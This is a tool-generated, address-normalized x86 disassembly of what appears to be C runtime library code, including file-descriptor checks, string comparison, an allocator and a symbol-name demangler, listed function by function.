or eax 0xffffffff
jmp r-xdata
cmp eax 0x40000
je r-xdata
call sub_407823
mov eax ebx
sar eax 0x5
lea edi [ eax * 4 + rwxdata ]
mov esi ebx
and esi 0x1f
shl esi 0x6
mov eax [ edi ]
movsx eax [ eax + esi + 0x4 ]
and eax 0x1
je r-xdata
call sub_4083c5
retn
cmp eax 0x20000
je r-xdata
push ebx
call sub_40ff5b
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ edi ]
test [ eax + esi + 0x4 ] 0x1
je r-xdata
call sub_4078ae
mov [ eax ] 0x16
call sub_4078ae
mov [ eax ] 0x9
or [ ebp - 0x1c ] 0xffffffff
push [ ebp + 0xc ]
push ebx
call sub_414412
pop ecx
pop ecx
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_41461f
mov eax [ ebp - 0x1c ]
sub_414627
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
cmp [ ebp + 0x10 ] 0x0
push ebx
push esi
push edi
je r-xdata
xor eax eax
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x10 ]
call sub_406900
mov ebx [ ebp + 0x8 ]
test ebx ebx
jne r-xdata
mov esi [ ebp + 0xc ]
test esi esi
je r-xdata
call sub_4078ae
mov [ eax ] 0x16
call sub_407823
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov edi 0x7fffffff
cmp [ ebp + 0x10 ] edi
jbe r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x14 ] 0x0
jne r-xdata
call sub_4078ae
mov [ eax ] 0x16
call sub_407823
cmp [ ebp - 0x4 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
sub ebx esi
push [ ebp + 0x10 ]
push esi
push ebx
call sub_41b600
add esp 0xc
mov eax edi
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
sub edi eax
mov eax edi
jmp r-xdata
test edi edi
je r-xdata
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
cmp edi eax
je r-xdata
movzx eax [ ebx + esi ]
lea ecx [ ebp - 0x10 ]
push ecx
push eax
call sub_41b4bb
mov edi eax
movzx eax [ esi ]
lea ecx [ ebp - 0x10 ]
push ecx
push eax
call sub_41b4bb
add esp 0x10
inc esi
dec [ ebp + 0x10 ]
je r-xdata
sub_414709
mov edi edi
push ebp
mov ebp esp
xor eax eax
cmp [ rwxdata ] eax
jne r-xdata
push eax
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_414627
add esp 0x10
pop ebp
retn
cmp [ ebp + 0x8 ] eax
jne r-xdata
cmp [ ebp + 0xc ] eax
je r-xdata
call sub_4078ae
mov [ eax ] 0x16
call sub_407823
mov eax 0x7fffffff
pop ebp
retn
cmp [ ebp + 0x10 ] 0x7fffffff
ja r-xdata
pop ebp
jmp sub_41b600
sub_41475c
mov edi edi
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
push ebx
mov ebx [ ebp + 0x10 ]
test ebx ebx
jne r-xdata
push esi
cmp ebx 0x4
jb r-xdata
xor eax eax
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
lea esi [ ebx - 0x4 ]
test esi esi
je r-xdata
pop ebx
leave
retn
cmp esi ebx
jb r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
mov dl [ eax ]
test dl dl
je r-xdata
xor eax eax
movzx eax [ eax - 0x4 ]
movzx ecx [ ecx - 0x4 ]
jmp r-xdata
cmp dl [ ecx - 0x4 ]
jne r-xdata
movzx eax [ eax ]
movzx ecx [ ecx ]
cmp dl [ ecx ]
jne r-xdata
sub eax ecx
jmp r-xdata
mov dl [ eax - 0x3 ]
test dl dl
je r-xdata
pop esi
inc eax
inc esi
inc ecx
movzx eax [ eax - 0x3 ]
movzx ecx [ ecx - 0x3 ]
jmp r-xdata
cmp dl [ ecx - 0x3 ]
jne r-xdata
mov dl [ eax - 0x2 ]
test dl dl
je r-xdata
movzx eax [ eax - 0x2 ]
movzx ecx [ ecx - 0x2 ]
jmp r-xdata
cmp dl [ ecx - 0x2 ]
jne r-xdata
mov dl [ eax - 0x1 ]
test dl dl
je r-xdata
movzx eax [ eax - 0x1 ]
movzx ecx [ ecx - 0x1 ]
jmp r-xdata
cmp dl [ ecx - 0x1 ]
jne r-xdata
add [ ebp - 0x4 ] 0x4
cmp [ ebp - 0x4 ] esi
jb r-xdata
mov dl [ eax ]
add eax 0x4
add ecx 0x4
test dl dl
je r-xdata
jmp r-xdata
mov esi [ ebp - 0x4 ]
jmp r-xdata
sub_414858
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ ecx ] eax
mov eax [ ebp + 0xc ]
mov [ ecx + 0x4 ] eax
xor eax eax
mov [ ecx + 0x10 ] eax
mov [ ecx + 0x8 ] eax
mov [ ecx + 0xc ] eax
pop ebp
retn 0x8
sub_414877
mov edi edi
push esi
mov esi ecx
cmp [ esi + 0x4 ] 0x0
je r-xdata
pop esi
retn
jmp r-xdata
mov eax [ esi + 0x8 ]
mov [ esi + 0xc ] eax
test eax eax
jne r-xdata
mov eax [ esi + 0xc ]
mov eax [ eax ]
push [ esi + 0xc ]
mov [ esi + 0x8 ] eax
call [ esi + 0x4 ]
pop ecx
sub_41489f
mov ecx [ rwxdata ]
mov dl [ ecx ]
test dl dl
jne r-xdata
cmp dl 0x30
jl r-xdata
xor eax eax
retn
xor eax eax
jmp r-xdata
cmp dl 0x39
jg r-xdata
cmp dl 0x40
jne r-xdata
movsx eax dl
sub eax 0x2f
inc ecx
mov [ rwxdata ] ecx
retn
test dl dl
je r-xdata
mov dl [ ecx ]
inc ecx
mov [ rwxdata ] ecx
cmp dl 0x40
je r-xdata
cmp dl 0x41
jl r-xdata
retn
or eax 0xffffffff
cmp dl 0x50
jg r-xdata
movsx edx dl
add eax eax
inc ecx
lea eax [ edx + eax * 8 - 0x41 ]
mov [ rwxdata ] ecx
mov dl [ ecx ]
sub_414901
mov ecx [ rwxdata ]
push ebx
push esi
mov edx 0x4000
push edi
mov al [ ecx ]
cmp al 0x41
jl r-xdata
inc ecx
mov esi edx
mov [ rwxdata ] ecx
cmp al 0x24
jne r-xdata
cmp al 0x5a
jle r-xdata
mov al [ ecx ]
cmp al 0x30
jl r-xdata
xor bl bl
inc ecx
mov [ rwxdata ] ecx
movsx eax [ ecx ]
cmp eax 0x42
jg r-xdata
movsx eax [ ecx ]
sub eax 0x41
mov edx 0x8000
inc ecx
or esi edx
mov [ rwxdata ] ecx
test al 0x1
je r-xdata
cmp al 0x39
jne r-xdata
cmp al 0x38
jg r-xdata
sub eax 0x43
je r-xdata
je r-xdata
and esi 0xffffdfff
or esi 0x2000
jmp r-xdata
xor ecx ecx
test al al
setne cl
lea esi [ ecx + 0xfffe ]
inc ecx
mov [ rwxdata ] ecx
mov esi 0xfffd
jmp r-xdata
movsx eax al
inc ecx
add eax 0xffffffd0
and esi 0xffff7fff
mov [ rwxdata ] ecx
cmp eax 0x8
ja r-xdata
or esi 0x7c00
dec eax
je r-xdata
or esi 0x9800
jmp r-xdata
test eax eax
je r-xdata
mov eax esi
mov ebx 0xffff9fff
mov edi 0x800
test edx esi
je r-xdata
cmp eax 0x18
jge r-xdata
mov eax 0xffff
jmp r-xdata
jmp [ eax * 4 + jump_table_414dc1 ]
and esi 0xfffff5ff
or esi 0x9100
jmp r-xdata
dec eax
je r-xdata
inc ecx
mov [ rwxdata ] ecx
jmp r-xdata
mov esi 0xfffe
dec ecx
jmp r-xdata
cmp eax 0x24
jne r-xdata
and esi ebx
and esi 0xffffefff
or esi edi
jmp r-xdata
pop edi
pop esi
pop ebx
retn
mov edx 0x8000
test edx esi
je r-xdata
mov edx 0x8000
test edx esi
je r-xdata
mov edx 0x8000
test edx esi
je r-xdata
and esi 0xffffdfff
or esi edx
jmp r-xdata
and esi 0xffffe3ff
or esi 0x6000
jmp r-xdata
and esi 0xffffbfff
or esi 0x2000
jmp r-xdata
and esi 0xffffebff
or esi 0x6800
jmp r-xdata
and esi 0xfffff3ff
or esi 0x7000
jmp r-xdata
and esi 0xfffffbff
or esi 0x7800
jmp r-xdata
and esi 0xfffff6ff
or esi 0x9200
jmp r-xdata
sub eax 0xd
jne r-xdata
cmp eax 0x2f
jle r-xdata
cmp [ ecx + 0x1 ] 0x50
jne r-xdata
test edx esi
je r-xdata
cmp ecx 0x8
je r-xdata
mov ecx eax
and ecx 0x18
je r-xdata
and esi 0xffff9fff
and esi 0xfffffaff
or esi 0x200
jmp r-xdata
and esi 0xffff9fff
and esi 0xfffffaff
or esi 0x200
jmp r-xdata
and esi 0xffff9fff
and esi 0xfffffaff
or esi 0x200
jmp r-xdata
inc ecx
mov [ rwxdata ] ecx
mov al [ ecx ]
mov bl 0x1
cmp al 0x30
jl r-xdata
cmp eax 0x35
jle r-xdata
inc ecx
mov [ rwxdata ] ecx
movsx eax [ ecx ]
cmp eax 0x4a
jg r-xdata
inc ecx
and esi 0xffffefff
or esi edi
and esi 0xffffff7f
or esi 0x40
jmp r-xdata
test edx esi
je r-xdata
cmp ecx 0x10
je r-xdata
and esi 0xffffefff
or esi 0x800
jmp r-xdata
and esi 0xffffff7f
or esi 0x40
jmp r-xdata
test edx esi
je r-xdata
and esi 0xfffff7ff
or esi 0x1000
jmp r-xdata
and esi 0xffffffbf
or esi 0x80
jmp r-xdata
test edx esi
je r-xdata
and esi 0xffffe7ff
jmp r-xdata
and esi 0xffffff3f
jmp r-xdata
test edx esi
je r-xdata
xor ecx ecx
test al al
sete cl
lea eax [ ecx + 0xfffe ]
jmp r-xdata
cmp al 0x35
jg r-xdata
movsx eax [ ecx ]
mov edx 0x8000
or esi edx
sub eax 0x30
mov edi 0x800
test edx esi
je r-xdata
cmp eax 0x41
jne r-xdata
cmp eax 0x4c
jl r-xdata
je r-xdata
dec eax
dec eax
je r-xdata
and eax 0x6
sub eax 0x0
je r-xdata
and esi 0xfffff7ff
or esi 0x1000
jmp r-xdata
and esi 0xffffffbf
or esi 0x80
jmp r-xdata
test edx esi
je r-xdata
and esi 0xffff9fff
and esi 0xffffefff
or esi edi
jmp r-xdata
and esi 0xfffff4ff
or esi 0x9000
jmp r-xdata
cmp eax 0x4d
jle r-xdata
inc ecx
mov [ rwxdata ] ecx
mov al [ ecx ]
cmp al 0x30
jl r-xdata
sub eax 0x0
je r-xdata
test edx esi
je r-xdata
dec eax
dec eax
je r-xdata
and esi 0xffffe7ff
jmp r-xdata
and esi 0xffffff3f
jmp r-xdata
and esi 0xfffffdff
or esi 0x500
and esi 0xfffffeff
or esi 0x600
jmp r-xdata
test bl bl
je r-xdata
inc ecx
mov [ rwxdata ] ecx
jmp r-xdata
cmp eax 0x4f
jle r-xdata
mov esi 0xffff
jmp r-xdata
cmp al 0x39
jg r-xdata
mov eax 0xfffe
jmp r-xdata
sub eax 0x46
je r-xdata
and esi ebx
jmp r-xdata
and esi 0xfffffaff
or esi 0x200
jmp r-xdata
and esi 0xfffff9ff
or esi 0x100
jmp r-xdata
dec eax
dec eax
jne r-xdata
and esi 0xffffdfff
or esi 0x2000
jmp r-xdata
test al 0x1
je r-xdata
xor esi esi
cmp [ ecx ] 0x5f
jne r-xdata
cmp eax 0x51
movsx eax al
lea eax [ ecx + eax - 0x2f ]
mov [ rwxdata ] eax
call sub_414901
or eax 0x10000
jmp r-xdata
dec eax
dec eax
jmp r-xdata
and esi 0xfffffcff
or esi 0x400
jmp r-xdata
test edx esi
je r-xdata
dec eax
dec eax
je r-xdata
and eax 0x6
sub eax 0x0
je r-xdata
jne r-xdata
and esi 0xffffefff
or esi edi
jmp r-xdata
and esi 0xffffff7f
or esi 0x40
jmp r-xdata
test edx esi
je r-xdata
dec eax
dec eax
jne r-xdata
and esi 0xfffff7ff
or esi 0x1000
jmp r-xdata
and esi 0xffffffbf
or esi 0x80
jmp r-xdata
test edx esi
je r-xdata
and esi 0xffffe7ff
jmp r-xdata
and esi 0xffffff3f
jmp r-xdata
sub_414ed8
mov edi edi
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
add edi 0x7
and edi 0xfffffff8
cmp [ ebp + 0xc ] 0x0
mov esi ecx
je r-xdata
test edi edi
jne r-xdata
push edi
call [ esi ]
pop ecx
jmp r-xdata
mov eax [ esi + 0x10 ]
push ebx
cmp eax edi
jae r-xdata
push 0x8
pop edi
pop edi
pop esi
pop ebp
retn 0x8
sub eax edi
mov [ esi + 0x10 ] eax
mov ebx 0x1000
cmp edi ebx
ja r-xdata
xor eax eax
jmp r-xdata
push 0x1
push 0x1004
mov ecx rwxdata
call sub_414ed8
test eax eax
je r-xdata
pop ebx
xor eax eax
and [ eax ] 0x0
jmp r-xdata
mov ecx [ esi + 0xc ]
test ecx ecx
je r-xdata
test eax eax
je r-xdata
mov [ esi + 0x8 ] eax
mov [ ecx ] eax
jmp r-xdata
mov eax [ esi + 0xc ]
mov ecx [ esi + 0x10 ]
lea eax [ eax + ecx + 0x4 ]
sub ebx edi
mov [ esi + 0xc ] eax
mov [ esi + 0x10 ] ebx
jmp r-xdata
sub_415070
mov edi edi
push ebp
mov ebp esp
mov eax ecx
cmp [ eax + 0x4 ] 0x3
je r-xdata
pop ebp
retn 0x4
mov ecx [ ebp + 0x8 ]
mov dl [ ecx + 0x4 ]
cmp dl 0x1
jle r-xdata
mov [ eax + 0x4 ] dl
sub_4150f5
mov edi edi
push ebp
mov ebp esp
mov eax ecx
mov ecx [ ebp + 0x8 ]
mov [ eax ] r--data
test ecx ecx
je r-xdata
mov [ eax + 0x4 ] ecx
pop ebp
retn 0x4
mov dl [ ecx + 0x4 ]
cmp dl 0x2
je r-xdata
xor ecx ecx
cmp dl 0x3
jne r-xdata
sub_41514c
mov edi edi
push ebp
mov ebp esp
mov eax [ ecx + 0x4 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
pop ebp
retn 0x8
mov eax [ eax ]
test eax eax
je r-xdata
mov edx [ eax ]
mov ecx eax
pop ebp
jmp [ edx + 0x8 ]
sub_41516d
mov edi edi
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov eax ecx
mov [ eax + 0x4 ] edx
dec edx
neg edx
sbb edx edx
and edx 0xfffffffc
add edx 0x4
mov [ eax ] r--data
mov [ eax + 0x8 ] edx
pop ebp
retn 0x4
sub_4151a2
mov edi edi
push ebp
mov ebp esp
xor ecx ecx
inc ecx
test [ rwxdata ] cl
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp eax 0x3
ja r-xdata
or [ rwxdata ] ecx
mov eax r--data
xor edx edx
mov [ rwxdata ] eax
mov [ rwxdata ] edx
mov [ rwxdata ] edx
mov [ rwxdata ] eax
mov [ rwxdata ] ecx
mov [ rwxdata ] 0x4
mov [ rwxdata ] eax
mov [ rwxdata ] 0x2
mov [ rwxdata ] edx
mov [ rwxdata ] eax
mov [ rwxdata ] 0x3
mov [ rwxdata ] edx
mov eax rwxdata
pop ebp
retn
imul eax eax 0xc
add eax rwxdata
pop ebp
retn
sub_415249
mov edi edi
push esi
mov esi ecx
cmp [ esi + 0xc ] 0x0
jge r-xdata
mov eax [ esi + 0xc ]
pop esi
retn
mov ecx [ esi + 0x8 ]
mov eax [ ecx ]
push ebx
push edi
mov edi [ esi + 0x4 ]
call [ eax ]
mov ebx eax
mov eax [ edi ]
mov ecx edi
call [ eax ]
add ebx eax
pop edi
mov [ esi + 0xc ] ebx
pop ebx
sub_415274
mov edi edi
push esi
mov esi ecx
mov ecx [ esi + 0x8 ]
mov eax [ ecx ]
call [ eax + 0x4 ]
test al al
jne r-xdata
pop esi
retn
mov ecx [ esi + 0x4 ]
mov eax [ ecx ]
pop esi
jmp [ eax + 0x4 ]
sub_415290
mov edi edi
push ebp
mov ebp esp
push esi
push [ ebp + 0xc ]
mov esi ecx
mov ecx [ esi + 0x4 ]
push [ ebp + 0x8 ]
mov eax [ ecx ]
call [ eax + 0x8 ]
cmp eax [ ebp + 0xc ]
jae r-xdata
pop esi
pop ebp
retn 0x8
push [ ebp + 0xc ]
mov ecx [ esi + 0x8 ]
mov edx [ ecx ]
push eax
call [ edx + 0x8 ]
sub_4152ca
mov edi edi
push esi
mov esi edx
test esi esi
je r-xdata
pop esi
retn
sub ecx eax
mov dl [ ecx + eax ]
mov [ eax ] dl
inc eax
dec esi
jne r-xdata
sub_4152e0
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
dec [ ebp + 0x8 ]
jne r-xdata
xor eax eax
pop ebp
retn
mov al [ ecx ]
test al al
je r-xdata
movzx eax [ ecx ]
movzx ecx [ edx ]
sub eax ecx
pop ebp
retn
cmp al [ edx ]
jne r-xdata
inc ecx
inc edx
sub_41530a
mov edi edi
push ebp
mov ebp esp
mov edx [ ebp + 0xc ]
mov eax ecx
or [ eax ] 0xffffffff
lea ecx [ eax + 0x2c ]
or [ ecx ] 0xffffffff
mov [ rwxdata ] edx
mov [ rwxdata ] edx
mov edx [ ebp + 0x8 ]
test edx edx
je r-xdata
and [ rwxdata ] 0x0
and [ rwxdata ] 0x0
push esi
mov esi [ ebp + 0x10 ]
mov [ rwxdata ] esi
mov [ rwxdata ] edx
pop esi
jmp r-xdata
mov [ rwxdata ] ecx
mov ecx [ ebp + 0x18 ]
mov [ rwxdata ] ecx
mov ecx [ ebp + 0x14 ]
mov [ rwxdata ] eax
mov [ rwxdata ] ecx
mov [ rwxdata ] 0x0
pop ebp
retn 0x14
sub_415379
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
xor ecx ecx
mov eax 0xffff0000
and [ ebp - 0x4 ] eax
and [ ebp - 0xc ] eax
push ecx
lea eax [ ebp - 0x8 ]
push eax
push r--data
lea eax [ ebp - 0x10 ]
push eax
push [ ebp + 0x8 ]
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x10 ] ecx
call sub_4191f8
mov eax [ ebp + 0x8 ]
add esp 0x14
leave
retn
sub_4153b2
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
and [ ebp - 0x8 ] 0x0
and [ ebp - 0x10 ] 0x0
mov eax 0xffff0000
and [ ebp - 0x4 ] eax
and [ ebp - 0xc ] eax
push 0x1
lea eax [ ebp - 0x8 ]
push eax
push r--data
lea eax [ ebp - 0x10 ]
push eax
push [ ebp + 0x8 ]
call sub_4191f8
mov eax [ ebp + 0x8 ]
add esp 0x14
leave
retn
sub_415403
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x14 ]
push edi
mov edi [ ebp + 0x8 ]
sub eax edi
cmp esi eax
jle r-xdata
test esi esi
je r-xdata
mov esi eax
lea eax [ edi + esi ]
pop edi
pop esi
pop ebp
retn
mov eax [ ebp + 0x10 ]
mov ecx edi
sub eax edi
mov edx esi
push ebx
mov bl [ eax + ecx ]
mov [ ecx ] bl
inc ecx
dec edx
jne r-xdata
pop ebx
sub_41543a
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
push esi
mov esi ecx
je r-xdata
and [ esi ] 0x0
mov [ esi + 0x4 ] 0x0
push 0x0
push 0x8
mov ecx rwxdata
call sub_414ed8
test eax eax
je r-xdata
xor eax eax
push [ ebp + 0x8 ]
mov ecx eax
call sub_4150f5
jmp r-xdata
and [ esi + 0x4 ] 0xffff00ff
mov eax esi
pop esi
pop ebp
retn 0x4
test eax eax
mov [ esi ] eax
setne al
dec al
and al 0x3
mov [ esi + 0x4 ] al
jmp r-xdata
sub_41548d
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
mov ecx [ ebp + 0x8 ]
and [ esi + 0x4 ] 0xffff00ff
cmp ecx 0x2
je r-xdata
mov eax ecx
cmp ecx 0x3
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push ecx
call sub_4151a2
pop ecx
mov [ esi ] eax
test eax eax
jne r-xdata
xor eax eax
jmp r-xdata
mov [ esi + 0x4 ] 0x3
and [ esi ] 0x0
mov [ esi + 0x4 ] al
cmp ecx 0x1
jne r-xdata
sub_4154d2
mov edi edi
push ebp
mov ebp esp
push ebx
mov ebx ecx
mov ecx [ ebx ]
push esi
mov esi [ ebp + 0x8 ]
push edi
test ecx ecx
je r-xdata
test esi esi
je r-xdata
test esi esi
jne r-xdata
pop edi
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x8
mov [ esi ] 0x0
mov edi [ ebp + 0xc ]
mov eax [ ecx ]
call [ eax ]
lea edi [ eax + 0x1 ]
push esi
push edi
mov ecx rwxdata
call sub_414ed8
mov esi eax
test esi esi
je r-xdata
mov eax [ ecx ]
lea edx [ esi + edi - 0x1 ]
push edx
push esi
call [ eax + 0x8 ]
mov eax esi
jmp r-xdata
jmp r-xdata
mov [ eax ] 0x0
jmp r-xdata
mov ecx [ ebx ]
test ecx ecx
jne r-xdata
sub_415531
mov edi edi
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
mov esi ecx
test edi edi
je r-xdata
mov [ esi + 0x4 ] 0x3
push 0x0
push 0x10
mov ecx rwxdata
call sub_414ed8
test eax eax
je r-xdata
xor eax eax
mov ecx [ esi ]
or [ eax + 0xc ] 0xffffffff
mov [ eax ] r--data
mov [ eax + 0x4 ] ecx
mov [ eax + 0x8 ] edi
jmp r-xdata
pop edi
pop esi
pop ebp
retn 0x4
mov [ esi ] eax
test eax eax
jne r-xdata
sub_415579
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
and [ esi ] 0x0
mov [ esi + 0x4 ] 0x0
and [ esi + 0x4 ] 0xffff00ff
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov [ esi + 0x4 ] 0x3
push 0x0
push 0x8
mov ecx rwxdata
call sub_414ed8
test eax eax
je r-xdata
xor eax eax
push [ ebp + 0x8 ]
mov ecx eax
call sub_4150f5
jmp r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
mov [ esi ] eax
test eax eax
jne r-xdata
sub_4155c6
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
mov esi ecx
and [ esi + 0x4 ] 0xffff00ff
mov [ esi + 0x4 ] al
cmp eax 0x1
jne r-xdata
and [ esi ] 0x0
push eax
call sub_4151a2
pop ecx
mov [ esi ] eax
test eax eax
jne r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
mov [ esi + 0x4 ] 0x3
jmp r-xdata
sub_4155fd
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
cmp [ esi ] 0x9
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push edi
mov edi [ ebp + 0x8 ]
cmp [ edi ] 0x0
je r-xdata
pop edi
push 0x0
push 0x8
mov ecx rwxdata
call sub_414ed8
test eax eax
je r-xdata
xor eax eax
mov ecx [ edi ]
mov [ eax ] ecx
mov ecx [ edi + 0x4 ]
mov [ eax + 0x4 ] ecx
jmp r-xdata
inc [ esi ]
mov ecx [ esi ]
mov [ esi + ecx * 4 + 0x4 ] eax
test eax eax
je r-xdata
sub_415647
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
cmp eax 0x9
ja r-xdata
mov ecx [ ebp + 0x8 ]
push 0x3
call sub_41548d
mov eax [ ebp + 0x8 ]
mov edx [ ecx ]
cmp edx 0xffffffff
je r-xdata
mov eax [ ebp + 0x8 ]
and [ eax + 0x4 ] 0xffff00ff
and [ eax ] 0x0
mov [ eax + 0x4 ] 0x2
jmp r-xdata
cmp eax edx
jg r-xdata
pop ebp
retn 0x8
mov ecx [ ecx + eax * 4 + 0x4 ]
mov edx [ ecx ]
mov eax [ ebp + 0x8 ]
mov [ eax ] edx
mov ecx [ ecx + 0x4 ]
mov [ eax + 0x4 ] ecx
jmp r-xdata
sub_415696
mov edi edi
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0xc ]
mov esi ecx
mov [ esi ] r--data
test edi edi
je r-xdata
and [ esi + 0x4 ] 0x0
and [ esi + 0x8 ] 0x0
cmp [ ebp + 0x8 ] 0x0
je r-xdata
push 0x0
push edi
mov ecx rwxdata
call sub_414ed8
mov [ esi + 0x4 ] eax
mov [ esi + 0x8 ] edi
test eax eax
je r-xdata
pop edi
mov eax esi
pop esi
pop ebp
retn 0x8
test edi edi
je r-xdata
mov ecx [ ebp + 0x8 ]
sub ecx eax
mov dl [ ecx + eax ]
mov [ eax ] dl
inc eax
dec edi
jne r-xdata
jmp r-xdata
sub_415720
mov edi edi
push ebp
mov ebp esp
cmp [ ecx + 0x4 ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
push 0x4
push r--data
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_415403
add esp 0x10
jmp r-xdata
pop ebp
retn 0x8
sub_415749
mov edi edi
push ebp
mov ebp esp
mov eax [ rwxdata ]
cmp [ eax ] 0x40
push [ ebp + 0xc ]
jne r-xdata
push [ ebp + 0x8 ]
call sub_41a0d5
pop ecx
pop ecx
mov ecx [ ebp + 0x8 ]
inc [ rwxdata ]
call sub_41543a
jmp r-xdata
mov eax [ ebp + 0x8 ]
pop ebp
retn
sub_41578d
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
cmp [ esi + 0x4 ] 0x1
jg r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
cmp [ esi ] 0x0
mov eax [ ebp + 0x8 ]
je r-xdata
push eax
call sub_4155c6
cmp eax 0x2
je r-xdata
cmp eax 0x3
je r-xdata
test eax eax
je r-xdata
push eax
call sub_4151a2
pop ecx
push eax
mov ecx esi
call sub_415531
jmp r-xdata
sub_4157cf
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi ecx
xor ebx ebx
cmp [ esi ] ebx
je r-xdata
push edi
mov edi [ ebp + 0x8 ]
cmp edi ebx
je r-xdata
and [ esi + 0x4 ] 0xffff00ff
mov [ esi + 0x4 ] 0x3
mov [ esi ] ebx
jmp r-xdata
mov [ esi + 0x4 ] 0x2
mov eax [ ebp + 0xc ]
cmp eax ebx
je r-xdata
pop esi
pop ebx
pop ebp
retn 0x8
sub eax ebx
je r-xdata
mov [ esi + 0x4 ] 0x3
jmp r-xdata
dec eax
push ebx
mov ecx rwxdata
je r-xdata
pop edi
push 0x8
call sub_414ed8
cmp eax ebx
je r-xdata
push 0xc
call sub_414ed8
cmp eax ebx
je r-xdata
xor eax eax
mov cl [ edi ]
mov [ eax ] r--data
mov [ eax + 0x4 ] cl
jmp r-xdata
push [ ebp + 0xc ]
mov ecx eax
push edi
call sub_415696
jmp r-xdata
mov [ esi ] eax
cmp eax ebx
jne r-xdata
sub_415852
mov edi edi
push ebp
mov ebp esp
xor eax eax
push esi
mov esi ecx
mov [ esi + 0x4 ] al
and [ esi + 0x4 ] 0xffff00ff
mov [ esi ] eax
cmp [ ebp + 0x8 ] al
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push 0x1
lea eax [ ebp + 0x8 ]
push eax
call sub_4157cf
sub_41587f
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
xor edx edx
push esi
mov esi ecx
mov [ esi + 0x4 ] dl
and [ esi + 0x4 ] 0xffff00ff
mov [ esi ] edx
cmp eax edx
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
xor ecx ecx
cmp [ eax ] dl
je r-xdata
inc ecx
cmp [ ecx + eax ] dl
jne r-xdata
cmp ecx edx
jbe r-xdata
push ecx
push eax
mov ecx esi
call sub_4157cf
sub_4158bc
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
xor edx edx
push edi
mov edi ecx
mov [ edi + 0x4 ] dl
and [ edi + 0x4 ] 0xffff00ff
mov [ edi ] edx
mov eax [ esi ]
cmp eax edx
je r-xdata
mov [ edi + 0x4 ] 0x2
cmp [ eax ] dl
je r-xdata
mov [ edi + 0x4 ] 0x1
jmp r-xdata
mov [ ebp + 0x8 ] eax
mov eax edi
pop edi
pop esi
pop ebp
retn 0x8
push edx
push [ ebp + 0x8 ]
mov ecx edi
call sub_4157cf
mov eax [ esi ]
mov cl [ eax ]
test cl cl
je r-xdata
cmp al 0x5f
je r-xdata
cmp [ edi + 0x4 ] 0x0
jne r-xdata
inc eax
mov [ esi ] eax
cmp cl [ ebp + 0xc ]
je r-xdata
inc edx
inc ecx
mov eax ecx
mov [ esi ] ecx
cmp [ eax ] 0x0
jne r-xdata
cmp al 0x24
je r-xdata
and [ edi ] 0x0
mov [ edi + 0x4 ] 0x3
jmp r-xdata
mov ecx [ esi ]
mov al [ ecx ]
cmp al [ ebp + 0xc ]
je r-xdata
cmp al 0x3c
je r-xdata
cmp al 0x3e
je r-xdata
cmp al 0x2d
je r-xdata
cmp al 0x61
jl r-xdata
cmp al 0x41
jl r-xdata
cmp al 0x7a
jle r-xdata
cmp al 0x30
jl r-xdata
cmp al 0x5a
jle r-xdata
cmp al 0x80
jb r-xdata
cmp al 0x39
jle r-xdata
test [ rwxdata ] 0x10000
je r-xdata
cmp al 0xfe
jbe r-xdata
sub_41597b
mov edi edi
push ebp
mov ebp esp
sub esp 0x24
mov eax [ rwxdata ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
xor eax eax
push esi
mov esi ecx
push edi
mov [ esi + 0x4 ] al
and [ esi + 0x4 ] 0xffff00ff
lea edi [ ebp - 0x8 ]
mov [ esi ] eax
